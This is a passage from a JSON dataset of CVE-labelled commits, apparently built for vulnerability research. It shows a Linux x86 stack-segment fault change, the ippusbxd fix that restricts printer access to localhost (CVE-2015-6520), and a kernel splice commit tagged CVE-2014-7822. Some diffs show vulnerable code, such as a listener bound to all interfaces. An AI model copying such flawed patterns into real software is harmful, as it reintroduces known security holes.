+24,6 @@ static char x86_stack_ids[][8] = {\n \t\t[ DEBUG_STACK-1\t\t\t]\t= \"#DB\",\n \t\t[ NMI_STACK-1\t\t\t]\t= \"NMI\",\n \t\t[ DOUBLEFAULT_STACK-1\t\t]\t= \"#DF\",\n-\t\t[ STACKFAULT_STACK-1\t\t]\t= \"#SS\",\n \t\t[ MCE_STACK-1\t\t\t]\t= \"#MC\",\n #if DEBUG_STKSZ > EXCEPTION_STKSZ\n \t\t[ N_EXCEPTION_STACKS ...\ndiff --git a\/arch\/x86\/kernel\/entry_64.S b\/arch\/x86\/kernel\/entry_64.S\nindex a4dc8de7c4be..49a0c1781253 100644\n--- a\/arch\/x86\/kernel\/entry_64.S\n+++ b\/arch\/x86\/kernel\/entry_64.S\n@@ -1259,7 +1259,7 @@ apicinterrupt3 HYPERVISOR_CALLBACK_VECTOR \\\n \n idtentry debug do_debug has_error_code=0 paranoid=1 shift_ist=DEBUG_STACK\n idtentry int3 do_int3 has_error_code=0 paranoid=1 shift_ist=DEBUG_STACK\n-idtentry stack_segment do_stack_segment has_error_code=1 paranoid=1\n+idtentry stack_segment do_stack_segment has_error_code=1\n #ifdef CONFIG_XEN\n idtentry xen_debug do_debug has_error_code=0\n idtentry xen_int3 do_int3 has_error_code=0\ndiff --git a\/arch\/x86\/kernel\/traps.c b\/arch\/x86\/kernel\/traps.c\nindex 819662746e23..48035e9cdde9 100644\n--- a\/arch\/x86\/kernel\/traps.c\n+++ b\/arch\/x86\/kernel\/traps.c\n@@ -233,27 +233,11 @@ DO_ERROR(X86_TRAP_UD,     SIGILL,  \"invalid opcode\",\t\tinvalid_op)\n DO_ERROR(X86_TRAP_OLD_MF, SIGFPE,  \"coprocessor segment overrun\",coprocessor_segment_overrun)\n DO_ERROR(X86_TRAP_TS,     SIGSEGV, \"invalid TSS\",\t\tinvalid_TSS)\n DO_ERROR(X86_TRAP_NP,     SIGBUS,  \"segment not present\",\tsegment_not_present)\n-#ifdef CONFIG_X86_32\n DO_ERROR(X86_TRAP_SS,     SIGBUS,  \"stack segment\",\t\tstack_segment)\n-#endif\n DO_ERROR(X86_TRAP_AC,     SIGBUS,  \"alignment check\",\t\talignment_check)\n \n #ifdef CONFIG_X86_64\n \/* Runs on IST stack *\/\n-dotraplinkage void do_stack_segment(struct pt_regs *regs, long error_code)\n-{\n-\tenum ctx_state prev_state;\n-\n-\tprev_state = exception_enter();\n-\tif (notify_die(DIE_TRAP, \"stack segment\", regs, error_code,\n-\t\t       X86_TRAP_SS, SIGBUS) != NOTIFY_STOP) {\n-\t\tpreempt_conditional_sti(regs);\n-\t\tdo_trap(X86_TRAP_SS, SIGBUS, \"stack segment\", regs, error_code, NULL);\n-\t\tpreempt_conditional_cli(regs);\n-\t}\n-\texception_exit(prev_state);\n-}\n-\n dotraplinkage void do_double_fault(struct pt_regs *regs, long error_code)\n {\n \tstatic const char str[] = \"double fault\";\n@@ -802,7 +786,7 @@ void __init trap_init(void)\n \tset_intr_gate(X86_TRAP_OLD_MF, coprocessor_segment_overrun);\n \tset_intr_gate(X86_TRAP_TS, invalid_TSS);\n \tset_intr_gate(X86_TRAP_NP, segment_not_present);\n-\tset_intr_gate_ist(X86_TRAP_SS, &stack_segment, STACKFAULT_STACK);\n+\tset_intr_gate(X86_TRAP_SS, stack_segment);\n \tset_intr_gate(X86_TRAP_GP, general_protection);\n \tset_intr_gate(X86_TRAP_SPURIOUS, spurious_interrupt_bug);\n \tset_intr_gate(X86_TRAP_MF, coprocessor_error);\n-- \ncgit 1.2-0.3.lf.el7\n\n","owner":"torvalds","repo":"linux","source":"cve"},{"CVE_ID":"CVE-2015-6520","CWE_ID":"264","category":"security","commit_id":"46844402bca7a38fc224483ba6f0a93c4613203f","commit_message":"From 46844402bca7a38fc224483ba6f0a93c4613203f Mon Sep 17 00:00:00 2001\nFrom: Till Kamppeter <till.kamppeter@gmail.com>\nDate: Sun, 9 Aug 2015 20:14:19 -0300\nSubject: [PATCH] SECURITY FIX: Actually restrict the access to the printer to\n localhost\n\nBefore, any machine in any network connected by any of the interfaces (as\nlisted by \"ifconfig\") could access to an IPP-over-USB printer on the assigned\nport, allowing users on remote machines to print and to access the web\nconfiguration interface of a IPP-over-USB printer in contrary to conventional\nUSB printers which are only accessible locally.\n---\n src\/ippusbxd.c |  28 ++++++++++---\n src\/tcp.c      | 108 +++++++++++++++++++++++++++++++++++++++++++++----\n src\/tcp.h      |   4 +-\n 3 files changed, 125 insertions(+), 15 deletions(-)\n\n","diff_code":"diff --git a\/src\/ippusbxd.c b\/src\/ippusbxd.c\nindex 9911d23..6e4fe54 100644\n--- a\/src\/ippusbxd.c\n+++ b\/src\/ippusbxd.c\n@@ -171,9 +171,12 @@ static void start_daemon()\n \n \t\/\/ Capture a socket\n \tuint16_t desired_port = g_options.desired_port;\n-\tstruct tcp_sock_t *tcp_socket;\n-\twhile ((tcp_socket = tcp_open(desired_port)) == NULL &&\n-\t       g_options.only_desired_port == 0) {\n+\tstruct tcp_sock_t *tcp_socket = NULL, *tcp6_socket = NULL;\n+\tfor (;;) {\n+\t\ttcp_socket = tcp_open(desired_port);\n+\t\ttcp6_socket = tcp6_open(desired_port);\n+\t\tif (tcp_socket || tcp6_socket || g_options.only_desired_port)\n+\t\t\tbreak;\n \t\t\/\/ Search for a free port\n \t\tdesired_port ++;\n \t\t\/\/ We failed with 0 as port number or we reached the max\n@@ -183,11 +186,16 @@ static void start_daemon()\n \t\t\t\/\/ ports\n \t\t\t\/\/ https:\/\/en.wikipedia.org\/wiki\/Ephemeral_port\n \t\t\tdesired_port = 49152;\n+\t\tNOTE(\"Access to desired port failed, trying alternative port %d\", desired_port);\n \t}\n-\tif (tcp_socket == NULL)\n+\tif (tcp_socket == NULL && tcp6_socket == NULL)\n \t\tgoto cleanup_tcp;\n \n-\tuint16_t real_port = tcp_port_number_get(tcp_socket);\n+\tuint16_t real_port;\n+\tif (tcp_socket)\n+\t  real_port = tcp_port_number_get(tcp_socket);\n+\telse\n+\t  real_port = tcp_port_number_get(tcp6_socket);\n \tif (desired_port != 0 && g_options.only_desired_port == 1 &&\n \t    desired_port != real_port) {\n \t\tERR(\"Received port number did not match requested port number.\"\n@@ -197,6 +205,9 @@ static void start_daemon()\n \tprintf(\"%u|\", real_port);\n \tfflush(stdout);\n \n+\tNOTE(\"Port: %d, IPv4 %savailable, IPv6 %savailable\",\n+\t     real_port, tcp_socket ? \"\" : \"not \", tcp6_socket ? \"\" : \"not \");\n+\n \t\/\/ Lose connection to caller\n \tuint16_t pid;\n \tif (!g_options.nofork_mode && (pid = fork()) > 0) {\n@@ -216,7 +227,10 @@ static void start_daemon()\n \t\t}\n \n \t\targs->usb_sock = usb_sock;\n-\t\targs->tcp = tcp_conn_accept(tcp_socket);\n+\n+\t\t\/\/ For each request\/response round we use the socket (IPv4 or\n+\t\t\/\/ IPv6) which receives data first\n+\t\targs->tcp = tcp_conn_select(tcp_socket, tcp6_socket);\n \t\tif (args->tcp == NULL) {\n \t\t\tERR(\"Failed to open tcp connection\");\n \t\t\tgoto cleanup_thread;\n@@ -243,6 +257,8 @@ static void start_daemon()\n cleanup_tcp:\n \tif (tcp_socket!= NULL)\n \t\ttcp_close(tcp_socket);\n+\tif (tcp6_socket!= NULL)\n+\t\ttcp_close(tcp6_socket);\n cleanup_usb:\n \tif (usb_sock != NULL)\n \t\tusb_close(usb_sock);\ndiff --git a\/src\/tcp.c b\/src\/tcp.c\nindex 31fc0f8..72689d3 100644\n--- a\/src\/tcp.c\n+++ b\/src\/tcp.c\n@@ -17,6 +17,9 @@\n #include <stdlib.h>\n #include <string.h>\n #include <ctype.h>\n+#include <sys\/time.h>\n+#include <sys\/types.h>\n+#include <unistd.h>\n \n #include <fcntl.h>\n #include <unistd.h>\n@@ -31,7 +34,58 @@ struct tcp_sock_t *tcp_open(uint16_t port)\n {\n \tstruct tcp_sock_t *this = calloc(1, sizeof *this);\n \tif (this == NULL) {\n-\t\tERR(\"callocing this failed\");\n+\t\tERR(\"IPv4: callocing this failed\");\n+\t\tgoto error;\n+\t}\n+\n+\t\/\/ Open [S]ocket [D]escriptor\n+\tthis->sd = -1;\n+\tthis->sd = socket(AF_INET, SOCK_STREAM, 0);\n+\tif (this->sd < 0) {\n+\t\tERR(\"IPv4 socket open failed\");\n+\t\tgoto error;\n+\t}\n+\n+\t\/\/ Configure socket params\n+\tstruct sockaddr_in addr;\n+\tmemset(&addr, 0, sizeof addr);\n+\taddr.sin_family = AF_INET;\n+\taddr.sin_port = htons(port);\n+\taddr.sin_addr.s_addr = htonl(0x7F000001);\n+\n+\t\/\/ Bind to localhost\n+\tif (bind(this->sd,\n+\t        (struct sockaddr *)&addr,\n+\t        sizeof addr) < 0) {\n+\t\tif (g_options.only_desired_port == 1)\n+\t\t\tERR(\"IPv4 bind on port failed. \"\n+\t\t\t    \"Requested port may be taken or require root permissions.\");\n+\t\tgoto error;\n+\t}\n+\n+\t\/\/ Let kernel over-accept max number of connections\n+\tif (listen(this->sd, HTTP_MAX_PENDING_CONNS) < 0) {\n+\t\tERR(\"IPv4 listen failed on socket\");\n+\t\tgoto error;\n+\t}\n+\n+\treturn this;\n+\n+error:\n+\tif (this != NULL) {\n+\t\tif (this->sd != -1) {\n+\t\t\tclose(this->sd);\n+\t\t}\n+\t\tfree(this);\n+\t}\n+\treturn NULL;\n+}\n+\n+struct tcp_sock_t *tcp6_open(uint16_t port)\n+{\n+\tstruct tcp_sock_t *this = calloc(1, sizeof *this);\n+\tif (this == NULL) {\n+\t\tERR(\"IPv6: callocing this failed\");\n \t\tgoto error;\n \t}\n \n@@ -39,7 +93,7 @@ struct tcp_sock_t *tcp_open(uint16_t port)\n \tthis->sd = -1;\n \tthis->sd = socket(AF_INET6, SOCK_STREAM, 0);\n \tif (this->sd < 0) {\n-\t\tERR(\"sockect open failed\");\n+\t\tERR(\"Ipv6 socket open failed\");\n \t\tgoto error;\n \t}\n \n@@ -48,21 +102,21 @@ struct tcp_sock_t *tcp_open(uint16_t port)\n \tmemset(&addr, 0, sizeof addr);\n \taddr.sin6_family = AF_INET6;\n \taddr.sin6_port = htons(port);\n-\taddr.sin6_addr = in6addr_any;\n+\taddr.sin6_addr = in6addr_loopback;\n \n \t\/\/ Bind to localhost\n \tif (bind(this->sd,\n \t        (struct sockaddr *)&addr,\n \t        sizeof addr) < 0) {\n \t\tif (g_options.only_desired_port == 1)\n-\t\t\tERR(\"Bind on port failed. \"\n+\t\t\tERR(\"IPv6 bind on port failed. \"\n \t\t\t    \"Requested port may be taken or require root permissions.\");\n \t\tgoto error;\n \t}\n \n \t\/\/ Let kernel over-accept max number of connections\n \tif (listen(this->sd, HTTP_MAX_PENDING_CONNS) < 0) {\n-\t\tERR(\"listen failed on socket\");\n+\t\tERR(\"IPv6 listen failed on socket\");\n \t\tgoto error;\n \t}\n \n@@ -179,20 +233,58 @@ void tcp_packet_send(struct tcp_conn_t *conn, struct http_packet_t *pkt)\n }\n \n \n-struct tcp_conn_t *tcp_conn_accept(struct tcp_sock_t *sock)\n+struct tcp_conn_t *tcp_conn_select(struct tcp_sock_t *sock,\n+\t\t\t\t   struct tcp_sock_t *sock6)\n {\n \tstruct tcp_conn_t *conn = calloc(1, sizeof *conn);\n \tif (conn == NULL) {\n \t\tERR(\"Calloc for connection struct failed\");\n \t\tgoto error;\n \t}\n+\tfd_set rfds;\n+\tstruct timeval tv;\n+\tint retval = 0;\n+\tint nfds = 0;\n+\twhile (retval == 0) {\n+\t\tFD_ZERO(&rfds);\n+\t\tif (sock) {\n+\t\t\tFD_SET(sock->sd, &rfds);\n+\t\t\tnfds = sock->sd;\n+\t\t}\n+\t\tif (sock6) {\n+\t\t\tFD_SET(sock6->sd, &rfds);\n+\t\t\tif (sock6->sd > nfds)\n+\t\t\t\tnfds = sock6->sd;\n+\t\t}\n+\t\tif (nfds == 0) {\n+\t\t\tERR(\"No valid TCP socket supplied.\");\n+\t\t\tgoto error;\n+\t\t}\n+\t\tnfds += 1;\n+\t\t\/* Wait up to five seconds. *\/\n+\t\ttv.tv_sec = 5;\n+\t\ttv.tv_usec = 0;\n+\t\tretval = select(nfds, &rfds, NULL, NULL, &tv);\n+\t\tif (retval == -1) {\n+\t\t\tERR(\"Failed to open tcp connection\");\n+\t\t\tgoto error;\n+\t\t}\n+\t}\n \n-\tconn->sd = accept(sock->sd, NULL, NULL);\n+\tif (sock && FD_ISSET(sock->sd, &rfds)) {\n+\t\tconn->sd = accept(sock->sd, NULL, NULL);\n+\t\tNOTE (\"Using IPv4\");\n+\t} else if (sock6 && FD_ISSET(sock6->sd, &rfds)) {\n+\t\tconn->sd = accept(sock6->sd, NULL, NULL);\n+\t\tNOTE (\"Using IPv6\");\n+\t} else {\n+\t\tERR(\"select failed\");\n+\t\tgoto error;\n+\t}\n \tif (conn->sd < 0) {\n \t\tERR(\"accept failed\");\n \t\tgoto error;\n \t}\n-\n \treturn conn;\n \n error:\ndiff --git a\/src\/tcp.h b\/src\/tcp.h\nindex 1e72e29..77a4eeb 100644\n--- a\/src\/tcp.h\n+++ b\/src\/tcp.h\n@@ -40,10 +40,12 @@ struct tcp_conn_t {\n };\n \n struct tcp_sock_t *tcp_open(uint16_t);\n+struct tcp_sock_t *tcp6_open(uint16_t);\n void tcp_close(struct tcp_sock_t *);\n uint16_t tcp_port_number_get(struct tcp_sock_t *);\n \n-struct tcp_conn_t *tcp_conn_accept(struct tcp_sock_t *);\n+struct tcp_conn_t *tcp_conn_select(struct tcp_sock_t *sock,\n+\t\t\t\t   struct tcp_sock_t *sock6);\n void tcp_conn_close(struct tcp_conn_t *);\n \n struct http_packet_t *tcp_packet_get(struct tcp_conn_t *,\n","owner":"tillkamppeter","repo":"ippusbxd","source":"cve"},{"CVE_ID":"CVE-2014-7822","CWE_ID":"264","category":"security","commit_id":"8d0207652cbe27d1f962050737848e5ad4671958","commit_message":"From 8d0207652cbe27d1f962050737848e5ad4671958 Mon Sep 17 00:00:00 2001\nFrom: Al Viro <viro@zeniv.linux.org.uk>\nDate: Sat, 5 Apr 2014 04:27:08 -0400\nSubject: [PATCH] ->splice_write() via ->write_iter()\n\niter_file_splice_write() - a ->splice_write() instance that gathers the\npipe buffers, builds a bio_vec-based iov_iter covering those and feeds\nit to ->write_iter().  A bunch of simple cases coverted to that...\n\n[AV: fixed the braino spotted by Cyrill]\n\nSigned-off-by: Al Viro <viro@zeniv.linux.org.uk>\n---\n fs\/block_dev.c        |   2 +-\n fs\/exofs\/file.c       |   2 +-\n fs\/ext2\/file.c        |   2 +-\n fs\/ext3\/file.c        |   2 +-\n fs\/ext4\/file.c        |   2 +-\n fs\/f2fs\/file.c        |   2 +-\n fs\/gfs2\/file.c        |   4 +-\n fs\/jfs\/file.c         |   2 +-\n fs\/ramfs\/file-mmu.c   |   2 +-\n fs\/ramfs\/file-nommu.c |   2 +-\n fs\/reiserfs\/file.c    |   2 +-\n fs\/splice.c           | 140 ++++++++++++++++++++++++++++++++++++++++++\n fs\/ubifs\/file.c       |   2 +-\n fs\/xfs\/xfs_file.c     |  43 +------------\n fs\/xfs\/xfs_trace.h    |   1 -\n include\/linux\/fs.h    |   2 +\n 16 files changed, 156 insertions(+), 56 deletions(-)\n\n","diff_code":"diff --git a\/fs\/block_dev.c b\/fs\/block_dev.c\nindex 4e36b8ea8aa45..e68e150b1b163 100644\n--- a\/fs\/block_dev.c\n+++ b\/fs\/block_dev.c\n@@ -1583,7 +1583,7 @@ const struct file_operations def_blk_fops = {\n \t.compat_ioctl\t= compat_blkdev_ioctl,\n #endif\n \t.splice_read\t= generic_file_splice_read,\n-\t.splice_write\t= generic_file_splice_write,\n+\t.splice_write\t= iter_file_splice_write,\n };\n \n int ioctl_by_bdev(struct block_device *bdev, unsigned cmd, unsigned long arg)\ndiff --git a\/fs\/exofs\/file.c b\/fs\/exofs\/file.c\nindex 5b7f6be5a2d54..71bf8e4fb5d42 100644\n--- a\/fs\/exofs\/file.c\n+++ b\/fs\/exofs\/file.c\n@@ -77,7 +77,7 @@ const struct file_operations exofs_file_operations = {\n \t.fsync\t\t= exofs_file_fsync,\n \t.flush\t\t= exofs_flush,\n \t.splice_read\t= generic_file_splice_read,\n-\t.splice_write\t= generic_file_splice_write,\n+\t.splice_write\t= iter_file_splice_write,\n };\n \n const struct inode_operations exofs_file_inode_operations = {\ndiff --git a\/fs\/ext2\/file.c b\/fs\/ext2\/file.c\nindex 970c6aca15ccb..7c87b22a7228c 100644\n--- a\/fs\/ext2\/file.c\n+++ b\/fs\/ext2\/file.c\n@@ -75,7 +75,7 @@ const struct file_operations ext2_file_operations = {\n \t.release\t= ext2_release_file,\n \t.fsync\t\t= ext2_fsync,\n \t.splice_read\t= generic_file_splice_read,\n-\t.splice_write\t= generic_file_splice_write,\n+\t.splice_write\t= iter_file_splice_write,\n };\n \n #ifdef CONFIG_EXT2_FS_XIP\ndiff --git a\/fs\/ext3\/file.c b\/fs\/ext3\/file.c\nindex c833b1226d4d4..a062fa1e1b113 100644\n--- a\/fs\/ext3\/file.c\n+++ b\/fs\/ext3\/file.c\n@@ -63,7 +63,7 @@ const struct file_operations ext3_file_operations = {\n \t.release\t= ext3_release_file,\n \t.fsync\t\t= ext3_sync_file,\n \t.splice_read\t= generic_file_splice_read,\n-\t.splice_write\t= generic_file_splice_write,\n+\t.splice_write\t= iter_file_splice_write,\n };\n \n const struct inode_operations ext3_file_inode_operations = {\ndiff --git a\/fs\/ext4\/file.c b\/fs\/ext4\/file.c\nindex 48383a5f37a1e..708aad7681991 100644\n--- a\/fs\/ext4\/file.c\n+++ b\/fs\/ext4\/file.c\n@@ -599,7 +599,7 @@ const struct file_operations ext4_file_operations = {\n \t.release\t= ext4_release_file,\n \t.fsync\t\t= ext4_sync_file,\n \t.splice_read\t= generic_file_splice_read,\n-\t.splice_write\t= generic_file_splice_write,\n+\t.splice_write\t= iter_file_splice_write,\n \t.fallocate\t= ext4_fallocate,\n };\n \ndiff --git a\/fs\/f2fs\/file.c b\/fs\/f2fs\/file.c\nindex 22f4900dd8eb4..e4ba4b93f96a9 100644\n--- a\/fs\/f2fs\/file.c\n+++ b\/fs\/f2fs\/file.c\n@@ -692,5 +692,5 @@ const struct file_operations f2fs_file_operations = {\n \t.compat_ioctl\t= f2fs_compat_ioctl,\n #endif\n \t.splice_read\t= generic_file_splice_read,\n-\t.splice_write\t= generic_file_splice_write,\n+\t.splice_write\t= iter_file_splice_write,\n };\ndiff --git a\/fs\/gfs2\/file.c b\/fs\/gfs2\/file.c\nindex ca932cd358d39..01b4c5b1bff8d 100644\n--- a\/fs\/gfs2\/file.c\n+++ b\/fs\/gfs2\/file.c\n@@ -1068,7 +1068,7 @@ const struct file_operations gfs2_file_fops = {\n \t.lock\t\t= gfs2_lock,\n \t.flock\t\t= gfs2_flock,\n \t.splice_read\t= generic_file_splice_read,\n-\t.splice_write\t= generic_file_splice_write,\n+\t.splice_write\t= iter_file_splice_write,\n \t.setlease\t= gfs2_setlease,\n \t.fallocate\t= gfs2_fallocate,\n };\n@@ -1098,7 +1098,7 @@ const struct file_operations gfs2_file_fops_nolock = {\n \t.release\t= gfs2_release,\n \t.fsync\t\t= gfs2_fsync,\n \t.splice_read\t= generic_file_splice_read,\n-\t.splice_write\t= generic_file_splice_write,\n+\t.splice_write\t= iter_file_splice_write,\n \t.setlease\t= generic_setlease,\n \t.fallocate\t= gfs2_fallocate,\n };\ndiff --git a\/fs\/jfs\/file.c b\/fs\/jfs\/file.c\nindex cc744ecaf51fa..33aa0cc1f8b86 100644\n--- a\/fs\/jfs\/file.c\n+++ b\/fs\/jfs\/file.c\n@@ -157,7 +157,7 @@ const struct file_operations jfs_file_operations = {\n \t.write_iter\t= generic_file_write_iter,\n \t.mmap\t\t= generic_file_mmap,\n \t.splice_read\t= generic_file_splice_read,\n-\t.splice_write\t= generic_file_splice_write,\n+\t.splice_write\t= iter_file_splice_write,\n \t.fsync\t\t= jfs_fsync,\n \t.release\t= jfs_release,\n \t.unlocked_ioctl = jfs_ioctl,\ndiff --git a\/fs\/ramfs\/file-mmu.c b\/fs\/ramfs\/file-mmu.c\nindex 6ea0b9718a9d3..4f56de822d2f5 100644\n--- a\/fs\/ramfs\/file-mmu.c\n+++ b\/fs\/ramfs\/file-mmu.c\n@@ -38,7 +38,7 @@ const struct file_operations ramfs_file_operations = {\n \t.mmap\t\t= generic_file_mmap,\n \t.fsync\t\t= noop_fsync,\n \t.splice_read\t= generic_file_splice_read,\n-\t.splice_write\t= generic_file_splice_write,\n+\t.splice_write\t= iter_file_splice_write,\n \t.llseek\t\t= generic_file_llseek,\n };\n \ndiff --git a\/fs\/ramfs\/file-nommu.c b\/fs\/ramfs\/file-nommu.c\nindex 9ed420f8f3cab..dda012ad4208d 100644\n--- a\/fs\/ramfs\/file-nommu.c\n+++ b\/fs\/ramfs\/file-nommu.c\n@@ -43,7 +43,7 @@ const struct file_operations ramfs_file_operations = {\n \t.write_iter\t\t= generic_file_write_iter,\n \t.fsync\t\t\t= noop_fsync,\n \t.splice_read\t\t= generic_file_splice_read,\n-\t.splice_write\t\t= generic_file_splice_write,\n+\t.splice_write\t\t= iter_file_splice_write,\n \t.llseek\t\t\t= generic_file_llseek,\n };\n \ndiff --git a\/fs\/reiserfs\/file.c b\/fs\/reiserfs\/file.c\nindex 7c8ecd6468db5..f070cc827456b 100644\n--- a\/fs\/reiserfs\/file.c\n+++ b\/fs\/reiserfs\/file.c\n@@ -248,7 +248,7 @@ const struct file_operations reiserfs_file_operations = {\n \t.read_iter = generic_file_read_iter,\n \t.write_iter = generic_file_write_iter,\n \t.splice_read = generic_file_splice_read,\n-\t.splice_write = generic_file_splice_write,\n+\t.splice_write = iter_file_splice_write,\n \t.llseek = generic_file_llseek,\n };\n \ndiff --git a\/fs\/splice.c b\/fs\/splice.c\nindex f99e420744c7f..f195a9b89fb22 100644\n--- a\/fs\/splice.c\n+++ b\/fs\/splice.c\n@@ -32,6 +32,7 @@\n #include <linux\/gfp.h>\n #include <linux\/socket.h>\n #include <linux\/compat.h>\n+#include <linux\/aio.h>\n #include \"internal.h\"\n \n \/*\n@@ -1052,6 +1053,145 @@ generic_file_splice_write(struct pipe_inode_info *pipe, struct file *out,\n \n EXPORT_SYMBOL(generic_file_splice_write);\n \n+\/**\n+ * iter_file_splice_write - splice data from a pipe to a file\n+ * @pipe:\tpipe info\n+ * @out:\tfile to write to\n+ * @ppos:\tposition in @out\n+ * @len:\tnumber of bytes to splice\n+ * @flags:\tsplice modifier flags\n+ *\n+ * Description:\n+ *    Will either move or copy pages (determined by @flags options) from\n+ *    the given pipe inode to the given file.\n+ *    This one is ->write_iter-based.\n+ *\n+ *\/\n+ssize_t\n+iter_file_splice_write(struct pipe_inode_info *pipe, struct file *out,\n+\t\t\t  loff_t *ppos, size_t len, unsigned int flags)\n+{\n+\tstruct splice_desc sd = {\n+\t\t.total_len = len,\n+\t\t.flags = flags,\n+\t\t.pos = *ppos,\n+\t\t.u.file = out,\n+\t};\n+\tint nbufs = pipe->buffers;\n+\tstruct bio_vec *array = kcalloc(nbufs, sizeof(struct bio_vec),\n+\t\t\t\t\tGFP_KERNEL);\n+\tssize_t ret;\n+\n+\tif (unlikely(!array))\n+\t\treturn -ENOMEM;\n+\n+\tpipe_lock(pipe);\n+\n+\tsplice_from_pipe_begin(&sd);\n+\twhile (sd.total_len) {\n+\t\tstruct iov_iter from;\n+\t\tstruct kiocb kiocb;\n+\t\tsize_t left;\n+\t\tint n, idx;\n+\n+\t\tret = splice_from_pipe_next(pipe, &sd);\n+\t\tif (ret <= 0)\n+\t\t\tbreak;\n+\n+\t\tif (unlikely(nbufs < pipe->buffers)) {\n+\t\t\tkfree(array);\n+\t\t\tnbufs = pipe->buffers;\n+\t\t\tarray = kcalloc(nbufs, sizeof(struct bio_vec),\n+\t\t\t\t\tGFP_KERNEL);\n+\t\t\tif (!array) {\n+\t\t\t\tret = -ENOMEM;\n+\t\t\t\tbreak;\n+\t\t\t}\n+\t\t}\n+\n+\t\t\/* build the vector *\/\n+\t\tleft = sd.total_len;\n+\t\tfor (n = 0, idx = pipe->curbuf; left && n < pipe->nrbufs; n++, idx++) {\n+\t\t\tstruct pipe_buffer *buf = pipe->bufs + idx;\n+\t\t\tsize_t this_len = buf->len;\n+\n+\t\t\tif (this_len > left)\n+\t\t\t\tthis_len = left;\n+\n+\t\t\tif (idx == pipe->buffers - 1)\n+\t\t\t\tidx = -1;\n+\n+\t\t\tret = buf->ops->confirm(pipe, buf);\n+\t\t\tif (unlikely(ret)) {\n+\t\t\t\tif (ret == -ENODATA)\n+\t\t\t\t\tret = 0;\n+\t\t\t\tgoto done;\n+\t\t\t}\n+\n+\t\t\tarray[n].bv_page = buf->page;\n+\t\t\tarray[n].bv_len = this_len;\n+\t\t\tarray[n].bv_offset = buf->offset;\n+\t\t\tleft -= this_len;\n+\t\t}\n+\n+\t\t\/* ... iov_iter *\/\n+\t\tfrom.type = ITER_BVEC | WRITE;\n+\t\tfrom.bvec = array;\n+\t\tfrom.nr_segs = n;\n+\t\tfrom.count = sd.total_len - left;\n+\t\tfrom.iov_offset = 0;\n+\n+\t\t\/* ... and iocb *\/\n+\t\tinit_sync_kiocb(&kiocb, out);\n+\t\tkiocb.ki_pos = sd.pos;\n+\t\tkiocb.ki_nbytes = sd.total_len - left;\n+\n+\t\t\/* now, send it *\/\n+\t\tret = out->f_op->write_iter(&kiocb, &from);\n+\t\tif (-EIOCBQUEUED == ret)\n+\t\t\tret = wait_on_sync_kiocb(&kiocb);\n+\n+\t\tif (ret <= 0)\n+\t\t\tbreak;\n+\n+\t\tsd.num_spliced += ret;\n+\t\tsd.total_len -= ret;\n+\t\t*ppos = sd.pos = kiocb.ki_pos;\n+\n+\t\t\/* dismiss the fully eaten buffers, adjust the partial one *\/\n+\t\twhile (ret) {\n+\t\t\tstruct pipe_buffer *buf = pipe->bufs + pipe->curbuf;\n+\t\t\tif (ret >= buf->len) {\n+\t\t\t\tconst struct pipe_buf_operations *ops = buf->ops;\n+\t\t\t\tret -= buf->len;\n+\t\t\t\tbuf->len = 0;\n+\t\t\t\tbuf->ops = NULL;\n+\t\t\t\tops->release(pipe, buf);\n+\t\t\t\tpipe->curbuf = (pipe->curbuf + 1) & (pipe->buffers - 1);\n+\t\t\t\tpipe->nrbufs--;\n+\t\t\t\tif (pipe->files)\n+\t\t\t\t\tsd.need_wakeup = true;\n+\t\t\t} else {\n+\t\t\t\tbuf->offset += ret;\n+\t\t\t\tbuf->len -= ret;\n+\t\t\t\tret = 0;\n+\t\t\t}\n+\t\t}\n+\t}\n+done:\n+\tkfree(array);\n+\tsplice_from_pipe_end(pipe, &sd);\n+\n+\tpipe_unlock(pipe);\n+\n+\tif (sd.num_spliced)\n+\t\tret = sd.num_spliced;\n+\n+\treturn ret;\n+}\n+\n+EXPORT_SYMBOL(iter_file_splice_write);\n+\n static int write_pipe_buf(struct pipe_inode_info *pipe, struct pipe_buffer *buf,\n \t\t\t  struct splice_desc *sd)\n {\ndiff --git a\/fs\/ubifs\/file.c b\/fs\/ubifs\/file.c\nindex 6bc4e8efbccf3..0888502a60415 100644\n--- a\/fs\/ubifs\/file.c\n+++ b\/fs\/ubifs\/file.c\n@@ -1585,7 +1585,7 @@ const struct file_operations ubifs_file_operations = {\n \t.fsync          = ubifs_fsync,\n \t.unlocked_ioctl = ubifs_ioctl,\n \t.splice_read\t= generic_file_splice_read,\n-\t.splice_write\t= generic_file_splice_write,\n+\t.splice_write\t= iter_file_splice_write,\n #ifdef CONFIG_COMPAT\n \t.compat_ioctl   = ubifs_compat_ioctl,\n #endif\ndiff --git a\/fs\/xfs\/xfs_file.c b\/fs\/xfs\/xfs_file.c\nindex 5446e86d34859..b1c489c1fb2e4 100644\n--- a\/fs\/xfs\/xfs_file.c\n+++ b\/fs\/xfs\/xfs_file.c\n@@ -342,47 +342,6 @@ xfs_file_splice_read(\n \treturn ret;\n }\n \n-\/*\n- * xfs_file_splice_write() does not use xfs_rw_ilock() because\n- * generic_file_splice_write() takes the i_mutex itself. This, in theory,\n- * couuld cause lock inversions between the aio_write path and the splice path\n- * if someone is doing concurrent splice(2) based writes and write(2) based\n- * writes to the same inode. The only real way to fix this is to re-implement\n- * the generic code here with correct locking orders.\n- *\/\n-STATIC ssize_t\n-xfs_file_splice_write(\n-\tstruct pipe_inode_info\t*pipe,\n-\tstruct file\t\t*outfilp,\n-\tloff_t\t\t\t*ppos,\n-\tsize_t\t\t\tcount,\n-\tunsigned int\t\tflags)\n-{\n-\tstruct inode\t\t*inode = outfilp->f_mapping->host;\n-\tstruct xfs_inode\t*ip = XFS_I(inode);\n-\tint\t\t\tioflags = 0;\n-\tssize_t\t\t\tret;\n-\n-\tXFS_STATS_INC(xs_write_calls);\n-\n-\tif (outfilp->f_mode & FMODE_NOCMTIME)\n-\t\tioflags |= IO_INVIS;\n-\n-\tif (XFS_FORCED_SHUTDOWN(ip->i_mount))\n-\t\treturn -EIO;\n-\n-\txfs_ilock(ip, XFS_IOLOCK_EXCL);\n-\n-\ttrace_xfs_file_splice_write(ip, count, *ppos, ioflags);\n-\n-\tret = generic_file_splice_write(pipe, outfilp, ppos, count, flags);\n-\tif (ret > 0)\n-\t\tXFS_STATS_ADD(xs_write_bytes, ret);\n-\n-\txfs_iunlock(ip, XFS_IOLOCK_EXCL);\n-\treturn ret;\n-}\n-\n \/*\n  * This routine is called to handle zeroing any space in the last block of the\n  * file that is beyond the EOF.  We do this since the size is being increased\n@@ -1442,7 +1401,7 @@ const struct file_operations xfs_file_operations = {\n \t.read_iter\t= xfs_file_read_iter,\n \t.write_iter\t= xfs_file_write_iter,\n 